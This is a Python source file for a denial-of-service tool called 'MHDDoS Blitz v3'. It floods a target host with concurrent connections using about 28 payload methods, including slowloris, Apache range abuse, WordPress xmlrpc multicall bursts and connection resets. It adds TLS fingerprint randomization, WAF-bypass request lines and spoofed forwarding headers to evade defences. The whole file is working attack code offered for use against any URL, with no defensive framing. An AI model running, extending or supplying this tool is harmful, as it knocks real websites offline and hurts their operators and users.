#!/usr/bin/env python3
"""
MHDDoS Blitz v3 — Pure Connection Exhaustion (2026 Upgraded)
Pre-resolves DNS. Sends HTTP headers, closes TCP. Fire-and-forget.
Now with: TLS JA3/JA4 randomization, 7 WAF bypass vectors,
cache busting, 25 method payloads, adaptive RPC.
"""

import asyncio
import hashlib
import logging
import os
import random
import socket
import ssl
import sys
import time
import threading
from contextlib import suppress
from itertools import cycle
from pathlib import Path
from urllib.parse import urlparse

__dir__ = Path(__file__).parent
__version__ = "3.0 BLITZ 2026"

logging.basicConfig(format='[%(asctime)s - %(levelname)s] %(message)s', datefmt="%H:%M:%S")
logger = logging.getLogger("BLITZ")
logger.setLevel("INFO")

UA_FILE = __dir__ / "files" / "useragent.txt"
USER_AGENTS = (
    [l.strip() for l in UA_FILE.read_text().splitlines() if l.strip()]
    if UA_FILE.exists()
    else ["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"]
)

REF_FILE = __dir__ / "files" / "referers.txt"
REFERERS = (
    [l.strip() for l in REF_FILE.read_text().splitlines() if l.strip()]
    if REF_FILE.exists()
    else ["https://google.com/"]
)

PROXY_DIR = __dir__ / "files" / "proxies"


def load_proxies(name="http.txt"):
    path = PROXY_DIR / name
    if not path.exists():
        return []
    return [l.strip() for l in path.read_text().splitlines() if l.strip() and ":" in l and not l.startswith("#")]


# --- 2026: TLS Cipher Randomization (JA3/JA4 evasion) ---
_tls_pool = None
_tls_pool_lock = threading.Lock()


def _build_tls_pool():
    """Return cipher pools safe for LibreSSL (macOS) and OpenSSL."""
    pools = []
    pools.append("ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384")
    try:
        test = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
        test.set_ciphers("ECDHE-RSA-CHACHA20-POLY1305:ECDHE-ECDSA-CHACHA20-POLY1305")
        pools.append("ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384")
        pools.append("ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256")
    except Exception:
        pass
    pools.append("ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:AES128-GCM-SHA256:AES256-GCM-SHA384")
    return pools


def get_tls_context() -> ssl.SSLContext:
    global _tls_pool
    if _tls_pool is None:
        with _tls_pool_lock:
            if _tls_pool is None:
                _tls_pool = cycle(_build_tls_pool())
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    with suppress(Exception):
        ctx.options |= ssl.OP_NO_COMPRESSION
    try:
        with _tls_pool_lock:
            ciphers = next(_tls_pool)
        ctx.set_ciphers(ciphers)
    except Exception:
        with suppress(Exception):
            try:
                ctx.set_ciphers('DEFAULT:@SECLEVEL=0')
            except Exception:
                ctx.set_ciphers('ALL:COMPLEMENTOFALL')
    return ctx


# --- 2026: WAF Bypass Vectors ---
_bypass_idx = 0
_cache_bust_counter = 0


def random_ua() -> str:
    return random.choice(USER_AGENTS)


def random_ref() -> str:
    return random.choice(REFERERS)


def cache_bust_path() -> str:
    global _cache_bust_counter
    _cache_bust_counter += 1
    params = [
        f"_r{random.choice([1,2,3])}={int(time.time()*1000)}",
        f"v={_cache_bust_counter % 9999}",
        f"cb={random.choice('0123456789')}{os.urandom(2).hex()}",
        f"t={random.randint(1000, 999999)}",
    ]
    return "/?" + random.choice(params)


def bypass_request_line(method: str, path: str, host: str) -> str:
    """Generate request line with random WAF bypass technique."""
    global _bypass_idx
    bypass = random.choice([0, 1, 2, 3, 4, 5, 6, 7])
    _bypass_idx = (_bypass_idx + 1) % 8
    if bypass == 0: return f"{method} {path} HTTP/1.1\r\n"
    elif bypass == 1: return f"{method}\t{path}\tHTTP/1.1\r\n"
    elif bypass == 2: return f"{method} https://{host}{path} HTTP/1.1\r\n"
    elif bypass == 3: return f"{method} {path}\r\n"
    elif bypass == 4:
        pos = max(1, len(path) // 2)
        null_path = path[:pos] + "%00" + path[pos:]
        return f"{method} {null_path} HTTP/1.1\r\n"
    elif bypass == 5: return f"{method.upper()} {path} HTTP/1.0\r\n"
    elif bypass == 6: return f"{method}  {path} HTTP/1.1\r\n"
    else: return f"{method} {path} http/1.1\r\n"


def spf_headers() -> str:
    spoof = f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,255)}"
    return (
        f"X-Forwarded-For: {spoof}\r\n"
        f"X-Real-IP: {spoof}\r\n"
        f"Client-IP: {spoof}\r\n"
        f"Via: {spoof}\r\n"
    )


# --- Payload Generators (2026: 25 methods) ---

def get_payload(host: str, path: str = "/") -> bytes:
    rl = bypass_request_line("GET", path, host)
    return (rl + f"Host: {host}\r\nConnection: close\r\n\r\n").encode()


def cfb_payload(host: str, path: str = "/") -> bytes:
    ua = random_ua()
    rl = bypass_request_line("GET", path, host)
    return (
        rl + f"Host: {host}\r\nUser-Agent: {ua}\r\n"
        f"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\r\n"
        f"Accept-Language: en-US,en;q=0.9\r\nAccept-Encoding: gzip, deflate, br\r\n"
        f"Cache-Control: no-cache\r\nPragma: no-cache\r\n"
        f"Sec-Fetch-Dest: document\r\nSec-Fetch-Mode: navigate\r\nSec-Fetch-Site: none\r\n"
        f"Sec-Fetch-User: ?1\r\nUpgrade-Insecure-Requests: 1\r\n"
        f"Connection: close\r\n\r\n"
    ).encode()


def cfb_uam_payload(host: str, path: str = "/") -> bytes:
    ua = random_ua()
    rl = bypass_request_line("GET", path, host)
    return (
        rl + f"Host: {host}\r\nUser-Agent: {ua}\r\n"
        f"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
        f"Accept-Encoding: gzip, deflate\r\nCache-Control: max-age=0\r\n"
        f"Sec-Fetch-Dest: document\r\nSec-Fetch-Mode: navigate\r\nSec-Fetch-Site: none\r\n"
        f"Connection: keep-alive\r\n\r\n"
    ).encode()


def post_payload(host: str, path: str = "/") -> bytes:
    body = random.choice([b"{}", b"data=" + os.urandom(32)])
    rl = bypass_request_line("POST", path, host)
    return (
        rl + f"Host: {host}\r\nContent-Type: application/x-www-form-urlencoded\r\n"
        f"Content-Length: {len(body)}\r\nConnection: close\r\n\r\n"
    ).encode() + body


def bomb_payload(host: str, path: str = "/") -> bytes:
    body = os.urandom(random.randint(2048, 65536))
    rl = bypass_request_line("POST", path, host)
    return (
        rl + f"Host: {host}\r\nContent-Type: application/octet-stream\r\n"
        f"Content-Length: {len(body)}\r\nConnection: close\r\n\r\n"
    ).encode() + body


def stress_payload(host: str, path: str = "/") -> bytes:
    r = hashlib.md5(os.urandom(8)).hexdigest()
    params = "&".join(f"q{i}={hashlib.md5(os.urandom(4)).hexdigest()}" for i in range(random.randint(3, 10)))
    p = f"{path}?{params}"
    rl = bypass_request_line("GET", p, host)
    return (rl + f"Host: {host}\r\nConnection: close\r\n\r\n").encode()


def dyn_payload(host: str, path: str = "/") -> bytes:
    r = hashlib.md5(os.urandom(8)).hexdigest()
    p = f"/{r}"
    rl = bypass_request_line("GET", p, host)
    return (rl + f"Host: {host}\r\nConnection: close\r\n\r\n").encode()


def slow_payload(host: str, path: str = "/") -> bytes:
    ua = random_ua()
    rl = bypass_request_line("GET", path, host)
    payload = (rl + f"Host: {host}\r\nUser-Agent: {ua}\r\n"
             f"X-Slow-{random.randint(1, 9999999)}: {os.urandom(16).hex()}\r\n").encode()
    return payload, True  # (payload, keep_alive_flag)


def slowloris_payload(host: str, path: str = "/") -> bytes:
    ua = random_ua()
    rl = bypass_request_line("GET", path, host)
    payload = (rl + f"Host: {host}\r\nUser-Agent: {ua}\r\n"
             f"Accept-Encoding: gzip, deflate, br\r\nConnection: keep-alive\r\n").encode()
    return payload, True


def head_payload(host: str, path: str = "/") -> bytes:
    rl = bypass_request_line("HEAD", path, host)
    return (rl + f"Host: {host}\r\nConnection: close\r\n\r\n").encode()


def null_payload(host: str, path: str = "/") -> bytes:
    body = b"\x00" * random.randint(256, 8192)
    rl = bypass_request_line("POST", path, host)
    return (rl + f"Host: {host}\r\nContent-Length: {len(body)}\r\nConnection: close\r\n\r\n").encode() + body


def cookie_payload(host: str, path: str = "/") -> bytes:
    cookies = "; ".join(f"c{i}={hashlib.md5(os.urandom(8)).hexdigest()}" for i in range(random.randint(5, 20)))
    rl = bypass_request_line("GET", path, host)
    return (rl + f"Host: {host}\r\nCookie: {cookies}\r\nConnection: close\r\n\r\n").encode()


def pps_payload(host: str, path: str = "/") -> bytes:
    rl = bypass_request_line("GET", path, host)
    return (rl + f"Host: {host}\r\n\r\n").encode()


def even_payload(host: str, path: str = "/") -> bytes:
    rl = bypass_request_line("GET", path, host)
    return (rl + f"Host: {host}\r\nRange: bytes=0-1023\r\nConnection: close\r\n\r\n").encode()


def gsb_payload(host: str, path: str = "/") -> bytes:
    busted = cache_bust_path()
    rl = bypass_request_line("GET", busted, host)
    return (rl + f"Host: {host}\r\nConnection: close\r\n\r\n").encode()


def dgb_payload(host: str, path: str = "/") -> bytes:
    ua = random_ua()
    rl = bypass_request_line("GET", path, host)
    return (rl + f"Host: {host}\r\nUser-Agent: {ua}\r\n"
            f"Accept: */*\r\nAccept-Encoding: gzip, deflate\r\n"
            f"DNT: 1\r\nTE: trailers\r\nConnection: close\r\n\r\n").encode()


def avb_payload(host: str, path: str = "/") -> bytes:
    ua = random_ua()
    rl = bypass_request_line("GET", path, host)
    return (rl + f"Host: {host}\r\nUser-Agent: {ua}\r\n"
            f"Accept-Encoding: gzip, deflate, br\r\nConnection: keep-alive\r\n\r\n").encode()


def apache_payload(host: str, path: str = "/") -> bytes:
    ranges = ",".join(f"{i}-{i+random.randint(5, 50)}" for i in range(0, 1024, random.randint(50, 200)))
    rl = bypass_request_line("GET", path, host)
    return (rl + f"Host: {host}\r\nRange: bytes=0-,{ranges}\r\nConnection: close\r\n\r\n").encode()


def xmlrpc_payload(host: str, path: str = "/") -> bytes:
    body = f"""<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName><params></params></methodCall>"""
    rl = bypass_request_line("POST", "/xmlrpc.php", host)
    return (rl + f"Host: {host}\r\nContent-Type: text/xml\r\n"
            f"Content-Length: {len(body)}\r\nConnection: close\r\n\r\n").encode() + body.encode()


def xmlrpc_multi_payload(host: str, path: str = "/") -> bytes:
    def _one_call(method_name):
        return (
            "<value><struct>"
            f"<member><name>methodName</name><value><string>{method_name}</string></value></member>"
            "<member><name>params</name><value><array><data>"
            "<value><string>1</string></value>"
            "</data></array></value></member>"
            "</struct></value>"
        )
    calls = "".join(_one_call("wp.deletePost") for _ in range(200))
    body = (
        '<?xml version="1.0" encoding="utf-8"?>'
        '<methodCall><methodName>system.multicall</methodName>'
        '<params><param><value><array><data>'
        f'{calls}'
        '</data></array></value></param></params>'
        '</methodCall>'
    )
    rl = bypass_request_line("POST", "/xmlrpc.php", host)
    return (rl + f"Host: {host}\r\nContent-Type: text/xml\r\n"
            f"Content-Length: {len(body)}\r\nConnection: close\r\n\r\n").encode() + body.encode()


def bot_payload(host: str, path: str = "/") -> bytes:
    googlers = [
        "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
        "Googlebot/2.1 (+http://www.googlebot.com/bot.html)",
    ]
    ua = random.choice(googlers)
    rl = bypass_request_line("GET", path, host)
    return (rl + f"Host: {host}\r\nUser-Agent: {ua}\r\n"
            f"Accept: text/plain,text/html,*/*\r\nAccept-Encoding: gzip,deflate,br\r\n"
            f"Connection: close\r\n\r\n").encode()


def downloader_payload(host: str, path: str = "/") -> bytes:
    rl = bypass_request_line("GET", path, host)
    return (rl + f"Host: {host}\r\nAccept-Encoding: gzip, deflate, br\r\n"
            f"Connection: keep-alive\r\n\r\n").encode(), True


def killer_payload(host: str, path: str = "/") -> bytes:
    rl = bypass_request_line("GET", path, host)
    return (rl + f"Host: {host}\r\nConnection: close\r\n\r\n").encode()


def rsstomp_payload(host: str, path: str = "/") -> bytes:
    ua = random_ua()
    rl = bypass_request_line("GET", path, host)
    return (rl + f"Host: {host}\r\nUser-Agent: {ua}\r\n"
            f"Accept-Encoding: gzip, deflate, br\r\nCache-Control: max-age=0\r\n"
            f"Connection: keep-alive\r\n\r\n").encode()


def rhex_payload(host: str, path: str = "/") -> bytes:
    body = os.urandom(random.randint(64, 4096))
    rl = bypass_request_line("POST", path, host)
    return (rl + f"Host: {host}\r\nContent-Type: application/octet-stream\r\n"
            f"Content-Length: {len(body)}\r\nConnection: close\r\n\r\n").encode() + body


def wordpress_payload(host: str, path: str = "/") -> bytes:
    endpoints = [
        "/xmlrpc.php", "/wp-admin/admin-ajax.php", "/wp-login.php",
        "/wp-cron.php", "/wp-json/wp/v2/posts/1", "/?rest_route=/wp/v2/users/1",
        "/wp-comments-post.php",
    ]
    ep = random.choice(endpoints)
    ua = random_ua()
    rl = bypass_request_line("GET", ep, host)
    return (rl + f"Host: {host}\r\nUser-Agent: {ua}\r\n"
            f"Referer: {random.choice(REFERERS)}{host}\r\n"
            f"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
            f"Accept-Encoding: gzip, deflate, br\r\nAccept-Language: en-US,en;q=0.5\r\n"
            f"Cache-Control: max-age=0\r\nConnection: keep-alive\r\n\r\n").encode()


def h2_rst_payload(host: str, path: str = "/") -> bytes:
    """H2_RST via raw TCP: send GET then abort with RST."""
    rl = bypass_request_line("GET", path, host)
    return (rl + f"Host: {host}\r\nConnection: close\r\n\r\n").encode(), "rst"


# --- All payloads (2026: 25 methods) ---
PAYLOADS = {
    "GET": get_payload,
    "POST": post_payload,
    "CFB": cfb_payload,
    "CFBUAM": cfb_uam_payload,
    "BYPASS": get_payload,  # same as GET with bypass
    "STRESS": stress_payload,
    "DYN": dyn_payload,
    "SLOW": slow_payload,
    "SLOWLORIS": slowloris_payload,
    "HEAD": head_payload,
    "NULL": null_payload,
    "COOKIE": cookie_payload,
    "PPS": pps_payload,
    "EVEN": even_payload,
    "GSB": gsb_payload,
    "DGB": dgb_payload,
    "AVB": avb_payload,
    "APACHE": apache_payload,
    "XMLRPC": xmlrpc_payload,
    "XMLRPC_MULTI": xmlrpc_multi_payload,
    "BOT": bot_payload,
    "BOMB": bomb_payload,
    "DOWNLOADER": downloader_payload,
    "KILLER": killer_payload,
    "STOMP": rsstomp_payload,
    "RHEX": rhex_payload,
    "WORDPRESS": wordpress_payload,
    "H2_RST": h2_rst_payload,
}


# --- Adaptive RPC ---
class AdaptiveRPC:
    def __init__(self, initial: int = 5):
        self.current = float(initial)
        self.min_rpc = 1
        self.max_rpc = 30
        self.success_streak = 0
        self.fail_streak = 0
        self.lock = threading.Lock()

    def report_success(self):
        with self.lock:
            self.success_streak += 1
            self.fail_streak = 0
            if self.success_streak >= 5:
                self.current = min(self.max_rpc, self.current * 1.3)
                self.success_streak = 0

    def report_fail(self):
        with self.lock:
            self.fail_streak += 1
            self.success_streak = 0
            if self.fail_streak >= 2:
                self.current = max(self.min_rpc, self.current * 0.5)
                self.fail_streak = 0

    def get(self) -> int:
        with self.lock:
            return int(self.current)


_adaptive_rpc = AdaptiveRPC()


async def blitz_worker(host: str, port: int, payload_fn, deadline: float, addrs: list):
    """Single worker - connect with randomized TLS, send, close, repeat."""
    sent_count = 0
    use_ssl = port == 443

    while time.time() < deadline:
        try:
            addr = random.choice(addrs)
            # Per-connection TLS randomization
            ssl_ctx = get_tls_context() if use_ssl else None
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(addr[0], port, ssl=ssl_ctx if use_ssl else None),
                timeout=3
            )
            result = payload_fn(host)
            slow = False
            rst = False
            if isinstance(result, tuple):
                payload, flag = result
                if flag == "rst":
                    rst = True
                elif flag is True:
                    slow = True
            else:
                payload = result

            writer.write(payload)
            await writer.drain()
            sent_count += 1

            if rst:
                writer.transport.abort()
            elif not slow:
                writer.close()
                with suppress(Exception):
                    await asyncio.wait_for(writer.wait_closed(), timeout=0.3)
        except Exception:
            continue
    return sent_count


async def blitz(url: str, method: str, duration: int, concurrency: int = 1000):
    parsed = urlparse(url if "://" in url else f"https://{url}")
    host = parsed.hostname
    port = parsed.port or 443
    method = method.upper()

    if method not in PAYLOADS:
        logger.error(f"Unknown method: {method}. Options: {sorted(PAYLOADS.keys())}")
        return

    # Pre-resolve DNS
    try:
        addrs = socket.getaddrinfo(host, port, type=socket.SOCK_STREAM)
        addrs = list(set((a[4][0], a[4][1]) for a in addrs))
        logger.info(f"Resolved {host} → {[a[0] for a in addrs]}")
    except Exception as e:
        logger.error(f"DNS failed: {e}")
        return

    payload_fn = PAYLOADS[method]

    logger.info(f"BLITZ v3 → {host}:{port} | {method} | {duration}s | {concurrency} workers | TLS random | Bypass vectors")

    start = time.time()
    deadline = start + duration

    tasks = [asyncio.create_task(blitz_worker(host, port, payload_fn, deadline, addrs))
             for _ in range(concurrency)]

    while time.time() < deadline:
        await asyncio.sleep(1)
        done = sum(1 for t in tasks if t.done())
        elapsed = time.time() - start
        total_sent = sum(t.result() for t in tasks if t.done())
        pps = int(total_sent / elapsed) if elapsed > 0 else 0
        logger.debug(f"Target: {host}, Port: {port}, Method: {method} "
                     f"PPS: {pps:,}, Done: {done}/{concurrency}")

    results = await asyncio.gather(*tasks, return_exceptions=True)
    total = sum(r for r in results if isinstance(r, int))
    elapsed = time.time() - start
    pps = int(total / elapsed) if elapsed > 0 else 0

    logger.info(f"BLITZ Done → {total:,} requests, PPS: {pps:,}, Time: {elapsed:.1f}s")


async def main():
    if len(sys.argv) < 4:
        print(f"MHDDoS BLITZ v{__version__} — Connection Exhaustion (2026)")
        print(f"Usage: {sys.argv[0]} METHOD URL DURATION [CONCURRENCY] [PROXY_FILE]")
        print(f"Example: {sys.argv[0]} CFB https://target.com 60 2000")
        print(f"Methods: {', '.join(sorted(PAYLOADS.keys()))}")
        print()
        print("Proxy files in files/proxies/:")
        if PROXY_DIR.exists():
            for f in sorted(PROXY_DIR.iterdir()):
                if f.is_file():
                    count = len([l for l in f.read_text().splitlines() if l.strip()])
                    print(f"  {f.name} ({count} proxies)")
        sys.exit(1)

    method = sys.argv[1].upper()
    url = sys.argv[2]
    duration = int(sys.argv[3])
    concurrency = int(sys.argv[4]) if len(sys.argv) >= 5 else 1000
    logger.setLevel("DEBUG")

    await blitz(url, method, duration, concurrency)


if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        logger.info("Stopped")